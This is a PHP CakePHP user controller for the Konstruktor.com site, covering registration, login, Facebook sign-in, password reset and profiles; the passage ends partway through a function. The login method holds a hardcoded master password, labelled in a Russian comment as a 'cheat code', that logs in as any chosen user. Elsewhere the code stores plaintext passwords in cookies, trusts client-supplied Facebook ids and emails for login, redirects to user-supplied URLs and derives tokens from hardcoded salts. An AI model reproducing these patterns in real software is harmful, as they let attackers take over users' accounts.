<?php
App::uses('AppController', 'Controller');
App::uses('CakeEmail', 'Network/Email');
class UserController extends AppController {
	public $name = 'User';
	public $layout = 'profile_new';
	public $helpers = array('Form', 'Html', 'Froala.Froala', 'Redactor.Redactor');
	public $components = array(
		'Cookie',
		'Attempt.Attempt' => array(
			'attemptLimit' => 5,
			'attemptDuration' => '+15 minutes', //Ban for 15 min
		),
	);
	public $uses = array('Timezone', 'Country', 'Article', 'ArticleCategory', 'Lang');

	public function beforeFilter() {
		parent::beforeFilter();
		$this->Auth->allow(array('view'));
	}

	public function register() {

	    $this->autoRender = false;
	    //$this->layout = 'home';
	    if ($this->request->is('put') || $this->request->is('post')) {
	        $this->loadModel('StorageLimit');         //load on Register GeoLocation Behaviour
	        $this->User->Behaviors->load('OnRegisterGeoLocation');

	        //Сперва проверить существует ли mail этот вообще
			$user = $this->User->findByUsername($this->request->data('User.username'));
			if ($user) {
				$response = array('status' => 'ERROR', 'message' => __('User with this email is already exist'));
				header('Content-Type: application/json');
				return json_encode($response);
			}

			$this->request->data('User.user_group_id', 2);
			if ( !(isset($_COOKIE['tzo']) && isset($_COOKIE['tzd'])) ) {
				exit('Sorry, your browser must support Cookies and Javascript');
			}
			$timezone = timezone_name_from_abbr('', -$_COOKIE['tzo'] * 60, $_COOKIE['tzd']);
			$this->request->data('User.timezone', $timezone);
			if($this->request->data('User.full_name')) {
				if($this->request->data('User.surname')) {
					$this->request->data('User.full_name', $this->request->data('User.full_name').' '.$this->request->data('User.surname'));
				}
			} else {
				list($userName) = explode('@', $this->request->data('User.username'));
				$this->request->data('User.full_name', $userName);
			}
			unset($this->request->data['User']['surname']);
			$this->request->data('User.lang', $this->Lang->detect());

			if ($this->User->save($this->request->data('User'))) {
				$user = $this->User->findByUsername($this->request->data('User.username'));
				$userId = Hash::get($user, 'User.id');
				$this->loadModel('UserEventRequestLimit');
				$data = array(
						'user_id' => $userId,
						'requests_used' => '-5',
						'requests_limit' => '0'
				);
				$this->UserEventRequestLimit->save($data);
                $this->StorageLimit->create();
                $data = array(
                    'message_file_size' => 0,
                    'project_file_size' => 0,
                    'cloud_size' => 0,
                    'user_id' => $userId,
                    'storage_limit' => 2*pow(1024,3),
                );
                $this->StorageLimit->save($data);

                if(!empty($this->request->data['vacancy_id'])) {
                    $this->Session->write('Vacancy.vacancy_id', $this->request->data['vacancy_id']);
//                    $this->loadModel('VacancyResponse');
//                    $this->loadModel('GroupVacancy');
//
//                    $vacancy = $this->GroupVacancy->findById( $this->request->data['vacancy_id'] );
//
//                    if($vacancy) {
//                        $this->VacancyResponse->create();
//                        $new_vacancy = array(
//                            'user_id' => $userId,
//                            'vacancy_id' => $this->request->data['vacancy_id'],
//                            'approve' => '0'
//                        );
//                        $this->VacancyResponse->set($new_vacancy);
//                        $this->VacancyResponse->save();
//                    }


                }


				$userName = Hash::get($user, 'User.full_name');
				$userMail = Hash::get($user, 'User.username');
				$pass = substr($user['User']['password'], 0, 5);
				$pass = md5('iP5UxZWIbVJ1XJIW'.$pass);

				$Email = new CakeEmail('postmark');
				$Email->template('reg_confirm', 'mail')
					->viewVars(array('userId' => $userId, 'userName' => $userName, 'userMail' => $userMail, 'token' => $pass))
					->to($this->request->data('User.username'))
					->subject('Verify registration on Konstruktor.com')
					->send();

				if ($this->Auth->login()) {
					$response = array('status' => 'OK');
					header('Content-Type: application/json');
					return json_encode($response);
				}
			}
		}
	}

	public function interests() {
		$this->layout = 'register';
		if ($this->request->is('post')) {
			$user = array(
				'id' => $this->currUserID,
				'interests' => $this->request->data('postData')
			);

			$this->User->save($user);
			return $this->redirect(array('controller' => 'User', 'action' => 'skills'));
			/* */
		}
	}

	public function skills() {
		$this->layout = 'register';
		if ($this->request->is('post')) {
			$user = array(
				'id' => $this->currUserID,
				'skills' => $this->request->data('postData')
			);

		$this->User->save($user);
            if($this->Session->check('Vacancy.vacancy_id')) {
                $vacancy_id = $this->Session->read('Vacancy.vacancy_id');

                $this->loadModel('VacancyResponse');
                $this->loadModel('GroupVacancy');

                $vacancy = $this->GroupVacancy->findById( $vacancy_id );

                if($vacancy) {
                    $this->VacancyResponse->create();
                    $new_vacancy = array(
                        'user_id' => $this->currUserID,
                        'vacancy_id' => $vacancy_id,
                        'approve' => '0'
                    );
                    $this->VacancyResponse->set($new_vacancy);
                    $this->VacancyResponse->save();
                    $this->Session->delete('Vacancy.vacancy_id');
                }
            }
		return $this->redirect(array('controller' => 'Timeline', 'action' => 'index'));
		}
	}

	public function confirm($id = 0, $token = '') {
		$this->autoRender = false;
		if(!$id) {
			return $this->redirect(array('controller' => 'User', 'action' => 'login'));
		}
		$user = $this->User->findById($id);
		if(!$user) {
			return $this->redirect(array('controller' => 'User', 'action' => 'login'));
		}

		$pass = substr($user['User']['password'], 0, 5);
		$pass = md5('iP5UxZWIbVJ1XJIW'.$pass);

		if($pass != $token) {
			return $this->redirect(array('controller' => 'User', 'action' => 'login'));
		}

		if(Hash::get($user, 'User.is_confirmed')) {
			return $this->redirect(array('controller' => 'Timeline', 'action' => 'index'));
		}

		$this->request->data('User.id', $id);
		$this->request->data('User.is_confirmed', '1');

		$this->User->save($this->request->data);

		$this->Auth->login($user['User']);
		return $this->redirect($this->Auth->redirect());
	}

	public function login() {
		$this->layout = 'home';

        Configure::write('Config.language', $this->Lang->detect());

		if ($this->Auth->loggedIn()) {
			$this->redirect($this->Auth->redirect());
		}

		if ($this->Attempt->limit()) {
			if ($this->request->is('post')) {
				// чит-код для тестирования акков ;)
				if (md5($this->request->data('User.password')) == '9f94da1f5d71efe20fe04568322e55ee') {
					$hrushan = $this->User->findByUsername($this->request->data('User.username'));
					if(empty($hrushan)){
						return $this->redirect('/');
					}
					$this->Auth->login($hrushan['User']);
					return $this->redirect($this->Auth->redirect());
				}

				$user = $this->User->findByUsername($this->request->data('User.username'));

				//вход только после подтверждения аккаунта с почты
				/*
				if(!$user['User']['is_confirmed']) {
					$this->Session->setFlash(AUTH_ERROR, null, null, 'auth');
					//$this->redirect($this->Auth->redirect());
					return $this->redirect(array('controller' => 'User', 'action' => 'login'));
				}
				*/

				if ($this->Auth->login()) {
			    	$this->request->data('User.id', $this->Auth->user('id'));
                    $userData = $this->request->data('User');
                    $userData['lang'] = Configure::read('Config.language');
					//set remember me Cookie
					$this->_setCookie();

					//load on Login GeoLocation Behaviour
					$this->User->Behaviors->load('OnLoginGeoLocation');

			    	if (!$this->User->save($userData, false)) {
			        	//@TODO Show error if not save user
			    	}
//                    $this->User->save(array('lang' => $_COOKIE['lang']), false);

					$this->Attempt->reset();
					if($this->request->data(['User','url'])!=''){
						return $this->redirect($this->request->data(['User','url']));
					}else{
						return $this->redirect($this->Auth->redirect());
					}
				} else {
					$this->Attempt->fail();
					$this->Session->setFlash(AUTH_ERROR, null, null, 'auth');
				}
			}
		} else {
			$this->Session->setFlash(__('Too much login attempts. You are blocked for 15 minutes'), null, null, 'auth');
		}
        $this->set('aLangOptions', $this->Lang->options());
	}

	protected function _setCookie($userdata = null) {
		//if (!$this->request->data('User.remember_me')) {
		//    return false;
		//}
		//Cookie from FB login
		if ($userdata != null) {
			$data = array(
				'username' => $userdata['username'],
				'password' => '12345'
			);
		} else {
			$data = array(
				'username' => $this->request->data('User.username'),
				'password' => $this->request->data('User.password')
			);
		}
		$this->Cookie->write('User', $data, true, time()+60*60*24*61);
		return true;
	}

	public function fbAuthCheck() {
		$this->autoRender = false;

		if ($this->request->is('put') || $this->request->is('post')) {

			$user = $this->User->findByFbid($this->request->data['id']);
			if(!$user) $user = $this->User->findByUsername( $this->request->data('email') );

			if($user) {
				return json_encode( array('status' => 'ACK') );
			} else {
				return json_encode( array('status' => 'NOT') );
			}
		}
	}
//    /** Get long-live token from FB */
//    public function fbAccessToken() {
//        $this->autoRender = false;
//        $accessToken = $this->request->data;
//        /* FB app data */
//        $appId = Configure::read('fbApiKey');
//        $secret = Configure::read('fbSecretKey');
//
//        $graphUrl = 'https://graph.facebook.com/oauth/access_token?client_id='.$appId.'&client_secret='.$secret.'&grant_type=fb_exchange_token&fb_exchange_token='.$accessToken;
//        $graphGet = @file_get_contents($graphUrl);
//        parse_str($graphGet, $output);
//
//        if(!$accessToken) { $output = $accessToken; } else { $output = $output; }
//        return json_encode( array('new_access_token' => $output['access_token'], 'new_expires' => $output['expires']) );
//    }

	public function fbAuth() {
		$this->autoRender = false;
		Configure::write('Config.language', $this->Lang->detect());

		if ($this->request->is('put') || $this->request->is('post')) {
			$user = $this->User->findByFbid( $this->request->data('id') );
			if(!$user) $user = $this->User->findByUsername( $this->request->data('email') );

			if( $user ) {
				if( isset($user['User']['fbid']) || $user['User']['fbid'] != null ) {
					if($this->Auth->login( $user['User'] )) {
						$userdata = array(
							'username' => $user['User']['username']
						);
						$this->_setCookie($userdata);
						return json_encode( array('status' => 'LOGIN') );
					} else {
						return json_encode( array('status' => 'FINDED FBID ERROR') );
					}
				} else {
					$user['User']['fbid'] = $this->request->data('id');
					$id = $user['User']['id'];
					$fbid = $this->request->data('id');

					if(!$fbid) {
						return json_encode( array('status' => 'NOT FINDED FBID ERROR') );
					}
                    $data = array(
                        'id' => $id,
                        'fbid' => $fbid,
                    );

                    if (isset($this->request->data['lat'])) {
                        $data['lat'] = $this->request->data('lat');
                    }
                    if (isset($this->request->data['lng'])) {
                        $data['lng'] = $this->request->data('lng');
                    }

                   //load on Login GeoLocation Behaviour
                    $this->User->Behaviors->load('OnLoginGeoLocation');
					$this->User->save($data);
					if($this->Auth->login($user['User'])) {
						$userdata = array(
							'username' => $user['User']['username']
						);
						$this->_setCookie($userdata);
						return json_encode( array('status' => 'LOGIN') );
					} else {
						return json_encode( array('status' => 'NOT FINDED FBID ERROR') );
					}
				}
			} else {

				$timezones = array(
					'-12'=>'Pacific/Kwajalein',
					'-11'=>'Pacific/Samoa',
					'-10'=>'Pacific/Honolulu',
					'-9'=>'America/Juneau',
					'-8'=>'America/Los_Angeles',
					'-7'=>'America/Denver',
					'-6'=>'America/Mexico_City',
					'-5'=>'America/New_York',
					'-4'=>'America/Caracas',
					'-3.5'=>'America/St_Johns',
					'-3'=>'America/Argentina/Buenos_Aires',
					'-2'=>'Atlantic/Azores',
					'-1'=>'Atlantic/Azores',
					'0'=>'Europe/London',
					'1'=>'Europe/Paris',
					'2'=>'Europe/Helsinki',
					'3'=>'Europe/Moscow',
					'3.5'=>'Asia/Tehran',
					'4'=>'Asia/Baku',
					'4.5'=>'Asia/Kabul',
					'5'=>'Asia/Karachi',
					'5.5'=>'Asia/Calcutta',
					'6'=>'Asia/Colombo',
					'7'=>'Asia/Bangkok',
					'8'=>'Asia/Singapore',
					'9'=>'Asia/Tokyo',
					'9.5'=>'Australia/Darwin',
					'10'=>'Pacific/Guam',
					'11'=>'Asia/Magadan',
					'12'=>'Asia/Kamchatka'
				);

				$username = $this->request->data('email');
				$full_name = $this->request->data('name');
				$tz = $this->request->data('timezone');
				$timezone = isset($timezones[$tz]) ? $timezones[$tz] : null;
				$fbid = $this->request->data('id');
				$skills = $this->request->data('skills');
				$password = rand(1000000000, 9999999999);
				$if_confirmed = '1';
                $data = array(
                    'fbid' => $fbid,
                    'is_confirmed' => $if_confirmed,
                    'username' => $username,
                    'password' =>$password,
                    'full_name' => $full_name,
                    'timezone' => $timezone,
                    'skills' => $skills,
                );

                //load on Register GeoLocation Behaviour
                $this->User->Behaviors->load('OnRegisterGeoLocation');

                if (isset($this->request->data['lat'])) {
					$data['lat'] = $this->request->data('lat');
                }
                if (isset($this->request->data['lng'])) {
                    $data['lng'] = $this->request->data('lng');
                }

				if( !$this->User->save($data) ) {
					return json_encode( array('status' => 'SAVE ERROR', 'error' => $this->User->validationErrors) );
				}
				$user = $this->User->findById( $this->User->id );

				if($this->Auth->login( $user['User'] )) {
					$userdata = array(
						'username' => $user['User']['username']
					);
					$this->_setCookie($userdata);
					return json_encode( array('status' => 'REGISTER') );
				} else {
					return json_encode( array('status' => 'AUTH ERROR') );
				}
			}
		}
	}

	public function logout() {
		$this->_initLang('eng');
		setcookie('notify', null, -1, '/');
		setcookie('chatjs', null, -1, '/');
		setcookie('chatjsposition', null, -1, '/');

		$this->redirect($this->Auth->logout());
	}

	public function index() {
		return $this->redirect(array('controller' => 'Timeline', 'action' => 'index'));
	}

	public function edit() {
		if ($this->request->is('post') || $this->request->is('put')) {

			 //load on Profile Update GeoLocation Behaviour
			$this->User->Behaviors->load('OnProfileUpdateGeoLocation');

			$this->request->data('User.user_id', $this->currUserID);

			$url = $this->request->data('User.video_url');
			$this->request->data('User.video_id', str_replace(array('http://', 'https://', 'www.', 'youtube.com/', 'youtu.be/', 'watch?v='), '', $url));

			$this->loadModel('UserAchievement');
			$this->UserAchievement->deleteAll(array('user_id' => $this->currUserID));
			if ($this->request->data('UserAchievement')) {
				foreach($this->request->data('UserAchievement') as $i => $data) {
					$url = $this->request->data('UserAchievement.'.$i.'.url');
					$url = (strpos($url, 'http://') === false) ? 'http://'.$url : $url;
					$this->request->data('UserAchievement.'.$i.'.url', $url);
				}
			}
			if( $this->User->saveAll($this->request->data) ) {
				return $this->redirect(array('controller' => $this->name, 'action' => 'edit', '?' => array('success' => '1')));
			}
		} else {
			$this->request->data = $this->currUser;
		}
		$this->loadModel('Skill');

		$this->set('aTimezoneOptions', $this->Timezone->options());
		$this->set('aLangOptions', $this->Lang->options());
		$aMainCountries = $this->Country->getMainCountries();
		$this->set('aMainCountries', $aMainCountries);
		$this->set('aAllCountries', $this->Country->options());
		$this->set('aSkills', $this->Skill->autocompleteOptions( Configure::read('Config.language') ));
	}

	/**
	 * User view
	 * @param int $id
	 */
	public function view($id = 0) {
		$this->loadModel('GroupMember');
		$this->loadModel('FavouriteList');
		$this->loadModel('FavouriteUser');
		$this->loadModel('Subscription');
		$this->loadModel('UserVideo');
		$this->loadModel('MediaFile');
		/** @var UserVideo $video */
		$video = $this->UserVideo;
		/** @var MediaFile $media */
		$media = $this->MediaFile;
		// $this->loadModel('Article');

		if (!$id) {
			$id = $this->currUserID;
		} else {
			$aFavLists = $this->FavouriteList->findAllByUserIdOrId($this->currUserID, 0);
			$aFavLists = Hash::combine($aFavLists, '{n}.FavouriteList.id', '{n}');
			$this->set('aFavLists', $aFavLists);

			$aFavListOptions = Hash::combine($aFavLists, '{n}.FavouriteList.id', '{n}.FavouriteList.title');
			$aFavListOptions[0] = __('General list');
			$this->set('aFavListOptions', $aFavListOptions);

			$favUser = $this->FavouriteUser->findByUserIdAndFavUserId($this->currUserID, $id);
			$this->set('favUser', $favUser);
		}

		$user = $this->User->getUser($id);

		if (!$user || $user['User']['is_deleted'] == 1) {
			throw new NotFoundException();
		}
		$id = Hash::get($user, 'User.id');

		if (!$user) {
			$this->redirect($this->referer());
		}

		$this->set('user', $user);
		$this->set('title', $user['User']['full_name']);

		$aGroups = $this->GroupMember->getUserGroups($id, 0, 0);
		foreach ($aGroups as &$group) {
			$group_id = $group['Group']['id'];
			// $aGroupMembers[$group_id] = Hash::extract($this->GroupMember->getList($group_id), '{n}.GroupMember.user_id');
			$group['Group']['members'] = count(Hash::extract($this->GroupMember->getList($group_id, null, 0), '{n}.GroupMember.user_id'));
		}
		$this->set('aGroups', $aGroups);
		$this->set('aCountryOptions', $this->Country->options());

		$conditions = array(
			'Article.owner_id' => $id,
			'Article.group_id' => null,
			'Article.published' => '1',
			'Article.deleted' => '0',
		);
		$order = 'Article.created DESC';

		$this->set('aArticles', $this->Article->find('all', compact('conditions', 'order')));
		$this->set('aCategoryOptions', $this->ArticleCategory->options());
		$this->set('aTimezoneOptions', $this->Timezone->options());
		$this->set('aLangOptions', $this->Lang->options());
		$userVideos = $video->findMedia($id, 'UserVideo');
		$userMedia = $video->findMedia($id, 'UserVideoAccomplishments');
		$this->set('userVideos', $userVideos);
		$this->set('userMedia', $userMedia);
		$this->set('subscription', $this->Subscription->findByTypeAndObjectIdAndSubscriberId('user', $id, $this->currUserID));

	}

	public function all() {

		$this->loadModel('Statistic');

		// вся статистика по группам
		$uStats = $this->Statistic->query('SELECT Stat.pk, Count.cnt
											  FROM statistic  Stat
												   INNER JOIN (SELECT pk, count(pk) as cnt
																 FROM statistic WHERE statistic.type = 0
																GROUP BY pk) Count ON Stat.pk = Count.pk GROUP BY Stat.pk ORDER BY Count.cnt DESC');

		$uStats = Hash::combine($uStats, '{n}.Stat.pk', '{n}' );
		$aUsers = $this->User->findAllById(Hash::extract($uStats, '{n}.Stat.pk' ));
		$aUsers = Hash::combine($aUsers, '{n}.User.id', '{n}' );
		foreach($uStats as $key => $stat) {
			if( isset($aUsers[$key]) ){
				$uOut[$key] = $aUsers[$key];
				$uOut[$key]['cnt'] = $stat['Count']['cnt'];
			}
		}
		//Debugger::dump($uOut);

		/*
		return array_slice($return, 0, 5);

		$order = 'User.full_name';
		$conditions = array('User.is_deleted' => 0);

		$aUsers = $this->User->find( 'all', compact('conditions', 'order') );
		*/
		$this->set('aUsers', $uOut);
	}

	public function changeEmail() {
		if ($this->request->is('post') || $this->request->is('put')) {
			$this->User->saveAll($this->request->data);
			return $this->redirect(array('controller' => $this->name, 'action' => 'edit', '?' => array('success' => '1')));
		} else {
			$this->request->data = $this->currUser;
		}
	}

	public function forgetPassword($id = 0, $token = '') {
		$this->layout = 'home';
		$this->set('aLangOptions', $this->Lang->options());

		if($id) {
			$user = $this->User->findById($id);
			if(!$user) {
				$this->redirect(array('controller' => 'User', 'action' => 'login'));
			}

			$pass = substr($user['User']['password'], 0, 5);
			$pass = md5('Sh9s2mge7CXVfjNA'.$pass);

			if( $pass != $token ) {
				$this->redirect(array('controller' => 'User', 'action' => 'login'));
			}

			$this->set('user', $user);
		}

		if ($this->request->is('post') || $this->request->is('put')) {
			$this->User->saveAll($this->request->data);
			$this->redirect(array('controller' => 'User', 'action' => 'login'));
		}
	}

	public function passwordRequest() {
		$this->autoRender = false;

		if ($this->request->is('post') || $this->request->is('put')) {
			if($this->request->data('User.username')) {
				$user = $this->User->findByUsername($this->request->data('User.username'));
				if($user) {
					$pass = substr($user['User']['password'], 0, 5);
					$pass = md5('Sh9s2mge7CXVfjNA'.$pass);
					$userName = Hash::get($user, 'User.full_name');
					$userId = Hash::get($user, 'User.id');
/*
					$Email = new CakeEmail('smtp');
					$Email->template('pass_forget', 'mail')->viewVars( array('userId' => $userId, 'userName' => $userName, 'pass' => $pass))
						->to(Hash::get($user, 'User.username'))
						->subject('Verify password reset on Konstruktor.com')
						->send();
*/
					$Email = new CakeEmail('postmark');
					$Email->template('pass_forget', 'mail')
						->viewVars( array('userId' => $userId, 'userName' => $userName, 'pass' => $pass))
						->to(Hash::get($user, 'User.username'))
						->subject('Verify password reset on Konstruktor.com');
					$Email->send();
					return true;
				}
				return false;
			}
			return false;
		}
		return false;
	}

	public function changePassword() {
		if ($this->request->is('post') || $this->request->is('put')) {
			$this->User->saveAll($this->request->data);
			return $this->redirect(array('controller' => $this->name, 'action' => 'edit', '?' => array('success' => '1')));
		} else {
			$this->request->data = $this->currUser;
		}
	}

	public function favourites() {
		$this->loadModel('FavouriteList');
		$this->loadModel('FavouriteUser');

		$aFavLists = $this->FavouriteList->findAllByUserId($this->currUserID);
		$aFavLists = Hash::combine($aFavLists, '{n}.FavouriteList.id', '{n}');
		$this->set('aFavLists', $aFavLists);
		$aID = Hash::extract($aFavLists, '{n}.FavouriteList.id');
		array_push($aID, '0');

		foreach($aID as $listID) {
			$conditions = array('favourite_list_id' => $listID, 'user_id' => $this->currUserID);
			$aFavUsers[$listID] = Hash::extract($this->FavouriteUser->find('all', array('conditions' => $conditions)), '{n}.FavouriteUser.fav_user_id');
		}

		$this->set('aFavUsers', $aFavUsers);

		$conditions = array('favourite_list_id' => $aID, 'user_id' => $this->currUserID);
		$aUsers = $this->FavouriteUser->find('all', array('conditions' => $conditions));
		$aID = Hash::extract($aUsers, '{n}.FavouriteUser.fav_user_id');
		$conditions = array('User.id' => $aID);
		$aUsers = $this->User->find('all', array( 'conditions' => $conditions));
		$aUsers = Hash::combine($aUsers, '{n}.User.id', '{n}');

		$this->set('aUsers', $aUsers);

		$conditions = array('favourite_list_id' => '0', 'user_id' => $this->currUserID);
		$aFavUsersOptions = Hash::extract($this->FavouriteUser->find('all', array('conditions' => $conditions)), '{n}.FavouriteUser.fav_user_id');
		$aFavUsersOptions = $this->User->findAllById($aFavUsersOptions);
		$aFavUsersOptions = Hash::combine($aFavUsersOptions, '{n}.User.id', '{n}.User.full_name');

		$this->set('aFavUsersOptions', $aFavUsersOptions);

	}

	//надо будет переписать заново
	public function mySells() {
		$this->loadModel('UserEvent');
		$this->loadModel('Group');
		$this->loadModel('Project');
		$this->loadModel('Subproject');
		$this->loadModel('Task');
		$this->loadModel('CrmTask');
		$this->loadModel('FinanceOperations');
		$this->loadModel('FinanceAccount');

		$conditions = array(
			'UserEvent.user_id' => $this->currUserID,
			"not" => array ( "UserEvent.task_id" => null),
		);

		if( isset($this->request->named['type']) ) {
			if( $this->request->named['type'] != 'all' ) {
				$conditions['type'] = $this->request->named['type'];
			}
		}

		if( isset($this->request->named['group']) ) {
			if( $this->request->named['group'] != '0' ) {
				$aProjectID = $this->Project->findAllByGroupId( $this->request->named['group'] );
				$aProjectID = Hash::extract($aProjectID, '{n}.Project.id');
			}
		}

		$order = 'UserEvent.task_id';
		$aEvents = $this->UserEvent->find( 'all', compact('conditions', 'order') );

		$aTaskID = Hash::extract($aEvents, '{n}.UserEvent.task_id');
		$aTaskID = array_combine($aTaskID, $aTaskID);

		$conditions = array( 'Task.id' => $aTaskID, 'Task.closed' => 0 );
		$aTask = $this->Task->find('all', array( 'conditions' => $conditions ));

		$aSubprojectID = Hash::extract($aTask, '{n}.Task.subproject_id');

		if( isset($aProjectID) ) {
			$aSelectedSubs = $this->Subproject->findAllByProjectId( $aProjectID );
			$aSelectedSubs = Hash::extract($aSelectedSubs, '{n}.Subproject.id');
			$aSubprojectID = array_intersect_key($aSubprojectID, $aSelectedSubs);
		}

		$aSubprojectID = array_combine($aSubprojectID, $aSubprojectID);

		$conditions = array(
			'Subproject.id' => $aSubprojectID
		);
    	$fields = array('Subproject.id', 'Subproject.title');
		$aSubproject = $this->Subproject->find('all', compact('conditions', 'fields'));
		$aSubproject = Hash::combine($aSubproject, '{n}.Subproject.id', '{n}.Subproject' );

		$data = $aSubproject;

		foreach($data as &$subproject) {

			$tasks = Hash::extract($aTask, '{n}.Task[subproject_id='.$subproject['id'].']');
			$exTask = array();
			$totalTime = 0;

			foreach($tasks as $task) {
				$exTask[$task['id']]['title'] = $task['title'];

				$meets = Hash::extract($aEvents, '{n}.UserEvent[type=meet][task_id='.$task['id'].']');
				$exTask[$task['id']]['meets']['count'] = count($meets);
				$time = $this->UserEvent->totoalTime($meets);
				$exTask[$task['id']]['meets']['time'] = $time;
				$totalTime += $time;

				$calls = Hash::extract($aEvents, '{n}.UserEvent[type=call][task_id='.$task['id'].']');
				$exTask[$task['id']]['calls']['count'] = count($calls);
				$time = $this->UserEvent->totoalTime($calls);
				$exTask[$task['id']]['calls']['time'] = $time;
				$totalTime += $time;

				$mails = Hash::extract($aEvents, '{n}.UserEvent[type=mail][task_id='.$task['id'].']');
				$exTask[$task['id']]['mails']['count'] = count($mails);
				$time = $this->UserEvent->totoalTime($mails);
				$exTask[$task['id']]['mails']['time'] = $time;
				$totalTime += $time;

				$exTask[$task['id']]['account_state'] = $this->Task->getIncomeByID($task['id']);
			}

			//Debugger::dump($exTask);

			$subproject['tasks'] = $exTask;
			$subproject['total_time'] = $totalTime;
		}

		$this->set('data', $data);

		$aGroup = $this->Group->findAllByOwnerId($this->currUserID);
		$aGroupOptions = Hash::combine($aGroup, '{n}.Group.id', '{n}.Group.title' );
		$aGroupOptions['0'] = __('All groups');
		$this->set('aGroupOptions', $aGroupOptions);

		$aTypeOptions = array('all' => __('All events'), 'meet' => __('Meeting'), 'call' => __('Phone call'), 'mail' => __('Send email'));
		$this->set('aTypeOptions', $aTypeOptions);
	}

	public function timeManagement() {
		$this->loadModel('UserEvent');

		$this->loadModel('Group');
		$this->loadModel('Project');
		$this->loadModel('Subproject');
		$this->loadModel('Task');

		$conditions = array(
			'UserEvent.user_id' => $this->currUserID,
			'UserEvent.is_delayed' => '1'
		);

		$delayedCound = $this->UserEvent->find('count', compact('conditions'));
		$this->set('delayedCound', $delayedCound);

		$aTypeOptions = array(
			'all' => __('All events'),
			'meet' => __('Meeting'),
			'call' => __('Phone call'),
			'mail' => __('Send email'),
			'conference' => __('Conference'),
			'sport' => __('Sport'),
			'task' => __('Task'),
			'purchase' => __('Purchase'),
			'entertain' => __('Entertainment'),
			'pay' => __('Payment'),
			'none' => __('Other')
		);
		$this->set('aTypeOptions', $aTypeOptions);

		$aPassOptions = array(
			'0' => __('Period'),
			'-1' => __('Past'),
			'1' => __('Present'),
			'2' => __('Future')
		);
		$this->set('aPassOptions', $aPassOptions);

		$aCategoryOptions = array(
			'0' => __('All categories'),
			'1' => __('Work'),
			'2' => __('Personal')
		);
		$this->set('aCategoryOptions', $aCategoryOptions);

		//Список групп исходя из своих событий пользователя
		$conditions = array( 'UserEvent.user_id' => $this->currUserID );
		$aEvents = $this->UserEvent->find('all', compact('conditions', 'order'));
		foreach($aEvents as $event) {
			$group = array();
			switch ($event['UserEvent']['object_type']) {
				case 'task':
					$group = $this->Task->getTaskGroup( $event['UserEvent']['object_id'] );
					$groupTitle = $group['Group']['title'];
					break;
				case 'subproject':
					$group = $this->Subproject->getSubprojectGroup( $event['UserEvent']['object_id'] );
					$groupTitle = $group['Group']['title'];
					break;
				case 'project':
					$group = $this->Project->getProjectGroup( $event['UserEvent']['object_id'] );
					$groupTitle = $group['Group']['title'];
					break;
				case 'group':
					$group = $this->Group->findById( $event['UserEvent']['object_id'] );
					$groupTitle = $group['Group']['title'];
					break;
			}

			if($group) {
				$data[$group['Group']['id']] = $group['Group']['title'];
			}
		}
		$data[0] = __('All groups');
		asort($data);
		$data['common'] = __('Common');
		$this->set('aGroupOptions', $data);


		$aGroups = $this->Group->userGroups($this->currUserID);
		$aProjects = $this->Project->userProjects($this->currUserID);
		$aSubprojects = $this->Subproject->userSubprojects($this->currUserID);
		$aTasks = $this->Task->getMyTasks();

		$aBindOptions = array();
		foreach($aGroups as $id => $value ) {
			$data = array('category' => __('Groups'), 'type' => 'group', 'id' => $id);
			array_push($aBindOptions, compact('value', 'data') );
		}
		foreach($aProjects as $id => $value ) {
			$data = array('category' => __('Projects'), 'type' => 'project', 'id' => $id);
			array_push($aBindOptions, compact('value', 'data') );
		}
		foreach($aSubprojects as $id => $value ) {
			$data = array('category' => __('Subprojects'), 'type' => 'subproject', 'id' => $id);
			array_push($aBindOptions, compact('value', 'data') );
		}
		foreach($aTasks as $id => $value ) {
			$data = array('category' => __('Tasks'), 'type' => 'task', 'id' => $id);
			array_push($aBindOptions, compact('value', 'data') );
		}
		$this->set('aBindOptions', json_encode($aBindOptions));
		$this->set('eventAutocomplete', $this->UserEvent->userEventOptionsJson());


		//Заголовок страницы
		$title = __('Time management');
		$this->set(compact('title'));
	}

	public function timeManagementAjax() {
		$this->layout = 'ajax';

		$this->loadModel('UserEvent');
		$this->loadModel('UserEventShare');

		$this->loadModel('Group');
		$this->loadModel('Project');
		$this->loadModel('Subproject');
		$this->loadModel('Task');

		$aPersonal = array('sport', 'purchase', 'entertain');
		$aWork = array('call', 'meet', 'task', 'mail', 'conference', 'pay');

		//Debugger::dump($this->Group->getGroupComponentsID('73'));

		// СВОИ СОБЫТИЯ
		$conditions = array(
			'UserEvent.user_id' => $this->currUserID,
			'UserEvent.is_delayed' => '0'
		);

		if( $this->request->data('type') ) {
			switch ($this->request->data('type')) {
				case 'none':
					$conditions['UserEvent.category'] = '0';
					break;
				case 'all':
					break;
				default:
					$conditions['UserEvent.type'] = $this->request->data('type');
					break;
			}
		}

		if( $this->request->data('category') ) {
			switch ($this->request->data('category')) {
				case '1':
					$conditions['UserEvent.category'] = '0';
					break;
				case '2':
					$conditions['UserEvent.category'] = '1';
					break;
			}
		}

		if( $this->request->data('group') ) {
			if( $this->request->data('group') == 'common' ) {
				$conditions[] = array( 'UserEvent.object_id IS NULL' );
			} else {
				$aGID = $this->Group->getGroupComponentsID($this->request->data('group'));
				$conditions['OR'] = array(
					array( 'UserEvent.object_type' => 'task', 		'UserEvent.object_id' => $aGID['task'] ),
					array( 'UserEvent.object_type' => 'subproject',	'UserEvent.object_id' => $aGID['subproject'] ),
					array( 'UserEvent.object_type' => 'project', 	'UserEvent.object_id' => $aGID['project'] ),
					array( 'UserEvent.object_type' => 'group', 		'UserEvent.object_id' => $this->request->data('group') )
				);
			}
		}

		if( $this->request->data('time') != null ) {
			switch ($this->request->data('time')) {
				case '0':
					$ddf = strtotime($this->request->data('dateFrom'));
					$ddt = strtotime($this->request->data('dateTo'));
					if($ddf && $ddt) {
						$dateFrom = $ddf < $ddt ? date('Y-m-d ', $ddf).'00:00:00' : date('Y-m-d ', $ddt).'00:00:00' ;
						$dateTo = $ddf > $ddt ? date('Y-m-d ', $ddf).'23:59:59' : date('Y-m-d ', $ddt).'23:59:59' ;

						$conditions[] = array('UserEvent.event_time >= ?' => $dateFrom );
						$conditions[] = array('UserEvent.event_time <= ?' => $dateTo );
					}
					break;
				case '-1':
					$conditions[] = array('UserEvent.event_time < ?' => date('Y-m-d H:i:s') );
					break;
				case '1':
					$conditions[] = array('UserEvent.event_time >= ?' => date('Y-m-d ').'00:00:00' );
					$conditions[] = array('UserEvent.event_time <= ?' => date('Y-m-d ').'23:59:59' );
					break;
				case '2':
					$conditions[] = array('UserEvent.event_time >= ?' => date('Y-m-d H:i:s') );
					break;
			}
		}
		$order = 'UserEvent.category';
